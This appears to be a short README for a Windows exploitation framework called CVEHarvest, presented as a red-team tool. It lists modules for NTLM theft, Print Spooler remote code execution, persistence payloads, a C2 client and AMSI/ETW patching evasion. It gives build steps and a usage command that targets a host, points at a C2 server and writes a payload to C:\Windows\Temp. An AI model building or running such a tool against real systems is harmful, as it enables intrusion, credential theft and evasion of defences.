# CVEHarvest

Multi-CVE exploitation framework for Windows systems in controlled, authorized testing scenarios.

## Features

- Modular exploit framework
- SMB relay / NTLM theft module
- Windows Print Spooler RCE module
- HTTP route probing module
- Payload builder with persistence scripting
- C2 client skeleton for heartbeat and result transmission
- Evasion layer: ETW patching, AMSI patching, sleep obfuscation, anti-VM checks

## Build

Windows:

```powershell
cmake -S . -B build -G "Visual Studio 17 2022"
cmake --build build --config Release
```

## Usage

```powershell
CVEHarvest.exe --target 192.168.1.10 --c2 10.0.0.10 --port 443 --output C:\Windows\Temp\payload.bin
```

## Notes

This project is intended only for authorized internal testing and red-team operations on systems you own or are explicitly permitted to assess.
